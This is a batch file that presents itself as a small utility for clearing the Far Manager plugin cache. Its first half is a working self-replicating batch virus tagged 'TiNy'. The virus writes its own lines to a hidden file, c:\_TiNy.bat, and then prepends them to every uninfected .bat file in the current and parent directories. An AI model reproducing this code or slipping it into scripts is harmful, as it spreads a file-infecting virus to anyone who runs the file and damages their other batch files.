@echo off%_TiNy%
if '%1=='TiNy goto TiNy%2
set TiNy=%0.bat
if not exist %TiNy% set TiNy=%0
if '%TiNy%==' set TiNy=autoexec.bat
if exist c:\_TiNy.bat goto TiNyg
if not exist %TiNy% goto eTiNy
find "TiNy"<%TiNy%>c:\_TiNy.bat
attrib c:\_TiNy.bat +h
:TiNyg
command /c c:\_TiNy TiNy vir
:eTiNy
set TiNy=
goto TiNyend
:TiNyvir
for %%a in (*.bat ..\*.bat) do call c:\_TiNy TiNy i %%a
exit TiNy
:TiNyi
find "TiNy"<%3>nul
if not errorlevel 1 goto TiNyend
type c:\_TiNy.bat>TiNy$
type %3>>TiNy$
move TiNy$ %3>nul
exit TiNy
:TiNyend
rem -------------------------------------------------------------------------------------------------------------
@echo off
rem This batch file cleared the Plugin Cache

echo REGEDIT4 > "%TEMP%\$DelOld$.reg"
echo [-HKEY_CURRENT_USER\Software\Far\PluginsCache] >> "%TEMP%\$DelOld$.reg"
start/wait regedit -s "%TEMP%\$DelOld$.reg"
del "%TEMP%\$DelOld$.reg" > nul
rem -------------------------------------------------------------------------------------------------------------